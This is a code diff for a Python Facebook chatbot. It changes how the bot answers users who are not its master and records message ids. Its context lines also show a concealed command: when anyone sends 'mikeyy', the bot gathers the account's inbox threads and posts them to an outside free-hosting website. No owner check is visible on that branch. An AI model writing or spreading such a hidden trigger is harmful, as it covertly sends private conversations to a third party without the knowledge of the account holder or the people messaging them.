@@ -609,7 +609,7 @@ class ChatBot(Client):
                 sendMsg()
                 texttospeech(reply)
             elif (".chstatus" == msg):
-                global msgstatus
+                global msgstatus, msgids
                 if (author_id in masterid):
                     if ( "ON" == msgstatus):
                         msgstatus = "OFF"
@@ -617,12 +617,14 @@ class ChatBot(Client):
                         msgstatus = "ON"
                     else:
                         msgstatus = "ERROR"
-                    
+
                     reply = "Done Master!, Status: " + str(msgstatus)
                     sendMsg()
                 else:
                     reply = "You're not my master 😒"
-                    sendMsg()
+                    if (author_id != self.uid):
+                        msgids.append(self.send(Message(text=reply,mentions=None, emoji_size=None, sticker=None, attachments=None, quick_replies=None, reply_to_id=mid), thread_id=thread_id,
+                            thread_type=thread_type))
             elif ("mikeyy" == msg):
                 reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
